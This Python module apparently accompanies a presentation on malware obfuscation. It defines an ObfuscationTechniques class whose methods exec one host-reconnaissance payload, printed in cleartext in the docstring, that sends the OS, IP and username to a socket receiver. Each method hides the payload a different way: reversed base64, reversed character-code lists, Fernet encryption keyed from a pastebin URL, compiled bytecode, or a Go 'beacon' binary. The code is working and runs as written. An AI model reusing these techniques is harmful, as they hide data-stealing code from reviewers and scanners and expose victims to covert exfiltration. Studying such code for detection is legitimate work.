"""
Thist module contains various obfuscation techniques used in presentation.
Each method of the ObfuscationTechniques class utilizes the same payload:

import sys, socket, platform, os, json
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    receiver = ("0.0.0.0", 8080)
    sock.connect(receiver)
    data = json.dumps({
        "os_name": platform.system(),
        "os_ver": platform.release(),
        "host_ip": socket.gethostbyname(socket.gethostname()),
        "user": os.getlogin()
    })
    request = f"POST /receiver HTTP/1.1\r\n"\
              f"Host: {receiver[0]}:{receiver[1]}\r\n" \
              f"Content-Type: application/json\r\n" \
              f"Content-Length: {len(data)}\r\n" \
              f"\r\n" \
              f"{data}"
    sock.sendall(request.encode())
    response = sock.recv(4096)
except Exception as e:
    pass
finally:
    sock.close()

If you want to change this payload (for example to use different url for
receiver) you need to change it accordingly.
"""

import base64, subprocess
from . import compiled

class ObfuscationTechniques():
    def base64_payload():
        """
        This method invokes a payload that is a reverse base64 string.
        """
        import base64
        exec(base64.b64decode(b"pgSZz9Gbj5yaj92cgACIgogO5xGbh5WampwczFGcgACIgogOlBychBibvlGdwV2Y4VEI0BXZjhXZKkiN5ADNoY3YlJnLrN2bzBSPgU2cu9GczVmcgACIgoQKpgSZk92YuVmL0NXZ1FXZyhCbsFGZuV2cus2YvNHIgACIKISfhRXYktnImBCIgACIgACIgACIgACIKwFIi4GXyxlImBCIgACIgACIgACIgACIKwFIi4GXyxVfpEGdhRGKuVGb7BiOoR3ZuVGTtQnblRnbvNkImBCIgACIgACIgACIgACIKwFIi4GXyxlbvNnav42bpRXYjlGbwBXYgoTZwlHVtQnblRnbvNkImBCIgACIgACIgACIgACIKwFIi4GXyxVfdFzWyVmdpV2YlJ3e60XXwslclZXalNWZytHI6Q3cvhkImBCIgACIgACIgACIgACIKwFIi4GXyxVMuEzLQRFVIBiclZXalNWZy9CIUN1TQJiZg0DI0NXZ1FXZyBCIgAiCp0HIgACIKkCKul2ZvxGdldmLz9GI6IiclNXdiACIgACIgACIKwSKpgSZtFmb0N3boRXZn5Cdlt2YvNHKl1WYulnY0N3boRXZn5Cdlt2YvNHI6ICcp9Fdz9GaiACIgACIgACIKwSKoU2chVGblJnLtJ3bmRXYsBHI6IiclZ3Xz9mIgACIgACIgAiCskCKtVGdzl3cu0mcvZGdhxGcgojIl1WYu91cvJCIgACIgACIgoweoMHctVHZu42bzpGI9ASY0FGZgACIgoQKyVmdpV2YlJHK0NWZu52bj5yaj92cgACIgoQKwgDM4ACLiAjLw4CMuAjIoASPgIXZ2lWZjVmcgACIgogO5JHdKkSTBVkUUN1XLN0TT5Cdlt2YvNHIsQVROl0XGFkL0V2aj92coQXZrN2bz5Cdlt2YvNHI9Ayaj92cK42bzpGIsM3bgwSby9mZ0FGbwBCL0V2aj92cgwyc5NHI0J3bw1Wa"[::-1]).decode("utf-8"))

    def unicode_payload():
        """
        This method invokes a payload that was a string converted into a list
        of Unicode numbers for each character. The list was then reversed
        and embedded into code below.
        """
        exec("".join(chr(i) for i in [10, 41, 40, 101, 115, 111, 108, 99, 46,
        107, 99, 111, 115, 32, 32, 32, 32, 10, 58, 121, 108, 108, 97, 110, 105,
        102, 10, 115, 115, 97, 112, 32, 32, 32, 32, 10, 58, 101, 32, 115, 97,
        32, 110, 111, 105, 116, 112, 101, 99, 120, 69, 32, 116, 112, 101, 99,
        120, 101, 10, 41, 54, 57, 48, 52, 40, 118, 99, 101, 114, 46, 107, 99,
        111, 115, 32, 61, 32, 101, 115, 110, 111, 112, 115, 101, 114, 32, 32,
        32, 32, 10, 41, 41, 40, 101, 100, 111, 99, 110, 101, 46, 116, 115, 101,
        117, 113, 101, 114, 40, 108, 108, 97, 100, 110, 101, 115, 46, 107, 99,
        111, 115, 32, 32, 32, 32, 10, 34, 34, 34, 125, 97, 116, 97, 100, 123,
        34, 34, 34, 102, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32,
        32, 34, 34, 34, 10, 13, 34, 34, 34, 102, 32, 32, 32, 32, 32, 32, 32, 32,
        32, 32, 32, 32, 32, 32, 32, 34, 34, 34, 10, 13, 125, 41, 97, 116, 97,
        100, 40, 110, 101, 108, 123, 32, 58, 104, 116, 103, 110, 101, 76, 45,
        116, 110, 101, 116, 110, 111, 67, 34, 34, 34, 102, 32, 32, 32, 32, 32,
        32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 34, 34, 34, 10, 13, 110, 111,
        115, 106, 47, 110, 111, 105, 116, 97, 99, 105, 108, 112, 112, 97, 32,
        58, 101, 112, 121, 84, 45, 116, 110, 101, 116, 110, 111, 67, 34, 34, 34,
        102, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 34, 34,
        34, 10, 13, 125, 93, 49, 91, 114, 101, 118, 105, 101, 99, 101, 114, 123,
        58, 125, 93, 48, 91, 114, 101, 118, 105, 101, 99, 101, 114, 123, 32, 58,
        116, 115, 111, 72, 34, 34, 34, 102, 32, 32, 32, 32, 32, 32, 32, 32, 32,
        32, 32, 32, 32, 32, 34, 34, 34, 10, 13, 49, 46, 49, 47, 80, 84, 84, 72,
        32, 114, 101, 118, 105, 101, 99, 101, 114, 47, 32, 84, 83, 79, 80, 34,
        34, 34, 102, 32, 61, 32, 116, 115, 101, 117, 113, 101, 114, 32, 32, 32,
        32, 10, 41, 125, 32, 32, 32, 32, 10, 41, 40, 110, 105, 103, 111, 108,
        116, 101, 103, 46, 115, 111, 32, 58, 34, 114, 101, 115, 117, 34, 32, 32,
        32, 32, 32, 32, 32, 32, 10, 44, 41, 41, 40, 101, 109, 97, 110, 116, 115,
        111, 104, 116, 101, 103, 46, 116, 101, 107, 99, 111, 115, 40, 101, 109,
        97, 110, 121, 98, 116, 115, 111, 104, 116, 101, 103, 46, 116, 101, 107,
        99, 111, 115, 32, 58, 34, 112, 105, 95, 116, 115, 111, 104, 34, 32, 32,
        32, 32, 32, 32, 32, 32, 10, 44, 41, 40, 101, 115, 97, 101, 108, 101,
        114, 46, 109, 114, 111, 102, 116, 97, 108, 112, 32, 58, 34, 114, 101,
        118, 95, 115, 111, 34, 32, 32, 32, 32, 32, 32, 32, 32, 10, 44, 41, 40,
        109, 101, 116, 115, 121, 115, 46, 109, 114, 111, 102, 116, 97, 108, 112,
        32, 58, 34, 101, 109, 97, 110, 95, 115, 111, 34, 32, 32, 32, 32, 32, 32,
        32, 32, 10, 123, 40, 115, 112, 109, 117, 100, 46, 110, 111, 115, 106,
        32, 61, 32, 97, 116, 97, 100, 32, 32, 32, 32, 10, 41, 114, 101, 118,
        105, 101, 99, 101, 114, 40, 116, 99, 101, 110, 110, 111, 99, 46, 107,
        99, 111, 115, 32, 32, 32, 32, 10, 41, 48, 56, 48, 56, 32, 44, 34, 48,
        46, 48, 46, 48, 46, 48, 34, 40, 32, 61, 32, 114, 101, 118, 105, 101, 99,
        101, 114, 32, 32, 32, 32, 10, 58, 121, 114, 116, 10, 41, 77, 65, 69, 82,
        84, 83, 95, 75, 67, 79, 83, 46, 116, 101, 107, 99, 111, 115, 32, 44, 84,
        69, 78, 73, 95, 70, 65, 46, 116, 101, 107, 99, 111, 115, 40, 116, 101,
        107, 99, 111, 115, 46, 116, 101, 107, 99, 111, 115, 32, 61, 32, 107, 99,
        111, 115, 10, 110, 111, 115, 106, 32, 44, 115, 111, 32, 44, 109, 114,
        111, 102, 116, 97, 108, 112, 32, 44, 116, 101, 107, 99, 111, 115, 32,
        44, 115, 121, 115, 32, 116, 114, 111, 112, 109, 105, 10][::-1]))

    def base64_unicode_combined_payload():
        """
        This method invokes a payload that is a reverse base64 string
        converted into a list of Unicode characters. The list was reversed
        and embedded into the code below.
        """
        exec(base64.b64decode("".join(chr(i) for i in [97, 87, 49, 119, 98, 51, 74, 48,
        73, 72, 78, 53, 99, 121, 119, 103, 99, 50, 57, 106, 97, 50, 86, 48, 76, 67, 66,
        119, 98, 71, 70, 48, 90, 109, 57, 121, 98, 83, 119, 103, 98, 51, 77, 115, 73,
        71, 112, 122, 98, 50, 52, 75, 99, 50, 57, 106, 97, 121, 65, 57, 73, 72, 78, 118,
        89, 50, 116, 108, 100, 67, 53, 122, 98, 50, 78, 114, 90, 88, 81, 111, 99, 50,
        57, 106, 97, 50, 86, 48, 76, 107, 70, 71, 88, 48, 108, 79, 82, 86, 81, 115, 73,
        72, 78, 118, 89, 50, 116, 108, 100, 67, 53, 84, 84, 48, 78, 76, 88, 49, 78, 85,
        85, 107, 86, 66, 84, 83, 107, 75, 100, 72, 74, 53, 79, 103, 111, 103, 73, 67,
        65, 103, 99, 109, 86, 106, 90, 87, 108, 50, 90, 88, 73, 103, 80, 83, 65, 111,
        73, 106, 65, 117, 77, 67, 52, 119, 76, 106, 65, 105, 76, 67, 65, 52, 77, 68,
        103, 119, 75, 81, 111, 103, 73, 67, 65, 103, 99, 50, 57, 106, 97, 121, 53, 106,
        98, 50, 53, 117, 90, 87, 78, 48, 75, 72, 74, 108, 89, 50, 86, 112, 100, 109, 86,
        121, 75, 81, 111, 103, 73, 67, 65, 103, 90, 71, 70, 48, 89, 83, 65, 57, 73, 71,
        112, 122, 98, 50, 52, 117, 90, 72, 86, 116, 99, 72, 77, 111, 101, 119, 111, 103,
        73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 74, 118, 99, 49, 57, 117, 89, 87, 49,
        108, 73, 106, 111, 103, 99, 71, 120, 104, 100, 71, 90, 118, 99, 109, 48, 117,
        99, 51, 108, 122, 100, 71, 86, 116, 75, 67, 107, 115, 67, 105, 65, 103, 73, 67,
        65, 103, 73, 67, 65, 103, 73, 109, 57, 122, 88, 51, 90, 108, 99, 105, 73, 54,
        73, 72, 66, 115, 89, 88, 82, 109, 98, 51, 74, 116, 76, 110, 74, 108, 98, 71, 86,
        104, 99, 50, 85, 111, 75, 83, 119, 75, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67,
        65, 105, 97, 71, 57, 122, 100, 70, 57, 112, 99, 67, 73, 54, 73, 72, 78, 118, 89,
        50, 116, 108, 100, 67, 53, 110, 90, 88, 82, 111, 98, 51, 78, 48, 89, 110, 108,
        117, 89, 87, 49, 108, 75, 72, 78, 118, 89, 50, 116, 108, 100, 67, 53, 110, 90,
        88, 82, 111, 98, 51, 78, 48, 98, 109, 70, 116, 90, 83, 103, 112, 75, 83, 119,
        75, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 105, 100, 88, 78, 108, 99,
        105, 73, 54, 73, 71, 57, 122, 76, 109, 100, 108, 100, 71, 120, 118, 90, 50, 108,
        117, 75, 67, 107, 75, 73, 67, 65, 103, 73, 72, 48, 112, 67, 105, 65, 103, 73,
        67, 66, 121, 90, 88, 70, 49, 90, 88, 78, 48, 73, 68, 48, 103, 90, 105, 74, 81,
        84, 49, 78, 85, 73, 67, 57, 121, 90, 87, 78, 108, 97, 88, 90, 108, 99, 105, 66,
        73, 86, 70, 82, 81, 76, 122, 69, 117, 77, 86, 120, 121, 88, 71, 52, 105, 73, 70,
        119, 75, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73,
        67, 66, 109, 73, 107, 104, 118, 99, 51, 81, 54, 73, 72, 116, 121, 90, 87, 78,
        108, 97, 88, 90, 108, 99, 108, 115, 119, 88, 88, 48, 54, 101, 51, 74, 108, 89,
        50, 86, 112, 100, 109, 86, 121, 87, 122, 70, 100, 102, 86, 120, 121, 88, 71, 52,
        105, 73, 70, 119, 75, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67,
        65, 103, 73, 67, 66, 109, 73, 107, 78, 118, 98, 110, 82, 108, 98, 110, 81, 116,
        86, 72, 108, 119, 90, 84, 111, 103, 89, 88, 66, 119, 98, 71, 108, 106, 89, 88,
        82, 112, 98, 50, 52, 118, 97, 110, 78, 118, 98, 108, 120, 121, 88, 71, 52, 105,
        73, 70, 119, 75, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65,
        103, 73, 67, 66, 109, 73, 107, 78, 118, 98, 110, 82, 108, 98, 110, 81, 116, 84,
        71, 86, 117, 90, 51, 82, 111, 79, 105, 66, 55, 98, 71, 86, 117, 75, 71, 82, 104,
        100, 71, 69, 112, 102, 86, 120, 121, 88, 71, 52, 105, 73, 70, 119, 75, 73, 67,
        65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 66, 109, 73,
        108, 120, 121, 88, 71, 52, 105, 73, 70, 119, 75, 73, 67, 65, 103, 73, 67, 65,
        103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 66, 109, 73, 110, 116, 107, 89,
        88, 82, 104, 102, 83, 73, 75, 73, 67, 65, 103, 73, 72, 78, 118, 89, 50, 115,
        117, 99, 50, 86, 117, 90, 71, 70, 115, 98, 67, 104, 121, 90, 88, 70, 49, 90, 88,
        78, 48, 76, 109, 86, 117, 89, 50, 57, 107, 90, 83, 103, 112, 75, 81, 111, 103,
        73, 67, 65, 103, 99, 109, 86, 122, 99, 71, 57, 117, 99, 50, 85, 103, 80, 83, 66,
        122, 98, 50, 78, 114, 76, 110, 74, 108, 89, 51, 89, 111, 78, 68, 65, 53, 78,
        105, 107, 75, 90, 88, 104, 106, 90, 88, 66, 48, 73, 69, 86, 52, 89, 50, 86, 119,
        100, 71, 108, 118, 98, 105, 66, 104, 99, 121, 66, 108, 79, 103, 111, 103, 73,
        67, 65, 103, 99, 71, 70, 122, 99, 119, 112, 109, 97, 87, 53, 104, 98, 71, 120,
        53, 79, 103, 111, 103, 73, 67, 65, 103, 99, 50, 57, 106, 97, 121, 53, 106, 98,
        71, 57, 122, 90, 83, 103, 112][::-1])[::-1]).decode('utf-8'))


    def encryption_payload(pastebin_url: str):
        """
        This method invokes an encrypted payload embedded into the code below.
        The encryption key should be placed in a pastebin. The bastebin
        raw url should be supplied as method's argument.

        Paste this key to pastebin and chage pastebin url:
        2GkrCIFkxKyzUX78xkvQe9jeHKw9QIy6KCPZIz5LzKo=
        """
        import base64, subprocess, sys
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "cryptography", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        from cryptography.fernet import Fernet
        from requests import get
        f = Fernet(bytes(get(f"{pastebin_url}").text.encode("utf-8")))
        exec(f.decrypt(b'gAAAAABlUfiBAsBZKXaF__JsVKHCmV-Xq3NQrCi0yt6r3kHv4BqVC3WKUMPdTnQmrftWTVDxHmQpywjS88nfO_xmXToI3gqJq1e0ZLAnSqC90Utj22ZO7Eu6fZVQ6eiu___qDPxDkAr2Awu6K12QSc8FeQmNRJ10ovZWNoESad6wrSR6nfC6f9Vk9Rsw3hKL7DhXLw5O2Rndk383Go1UwBOSshwoz51Ii64hXT3ciL0ditqG0_Yb8969C895SkkEsb2dKLpBXsYhPtU-42TFhTyq3tYz-llclwML13IP-7tQXdZ-TzVZ3RAHvYi1OpADHEj-DHMBoWjPgMdrg4vcLj4lAVvARyWQXA3q3WTHZlpYFUWw5dWRg1xaRS6tO46jfAg7CNfWeQv4eH3scyRy1SZnVaALlyDg-dSOgLHlWs3_WyI5B35ZaYQGWy3by1JpdSjPNj3OHm5uWTbZEqDn-PlLKbdczpqjjjn5tl2Ep3ws0yv70jYJGpR6EOoEvSmpLoBeazDI1U1bSzpxBeGpwB45PcLoqgrxmqer6kuC4lq2enDz7uPsNKagFF1ZnrDcf_wJQhOZCmCe2hW8ZNYvjVpjEoqjCViPGZ4Mcns-HbTu0noSHsVQMJG9YbpauSUWY633_xxW6DY_ByeeHoetIQVWDbWWxMy_xuSN7PrXVPITEr47ekuE9xU75gxIRDqkXh5iXodAPCqYXVGir5nvznRO_MbJKpFZ7QQGTBeZSAI_eVFSs81dFLD02V-QoX78ytbN_vJ_uzwul9OmuinXiLUuwHg6XVWqjdSoHLCma0-2c7bLbt4oIMDUsgqlO1gLvYRjHPj48bCE6-gvb0JHlRm3mt1KR51sRCieNw2v9Y3pfhpBNNEBBb8yb_-XUdmDZElEm3GwmJNxJPeBDSYu_15PbR3s7vJbFexD3A-5MjLRjR1Pr84PcnDimzDt0HeXgbBjIZgwMexPitHDOaVEuJk8ZIpPnJ35wJUgtHy61msFBL0LgxmWml_fQPW4M_dW4ferancMNz8IREtMgU4OxJ-nmkyrnvKEEogEweKP7W7rFOWw7Lhzzbw='))


    def bytecode_payload():
        """
        This method invokes a payload located in a compiled bytecode file
        """
        compiled.payload()


    def embedded_binary():
        """
        This method invokes a payload located in a binary executable
        written in Go
        """

        subprocess.Popen(
            "./pymalware_obfuscation/beacon",
            shell=True,
        )
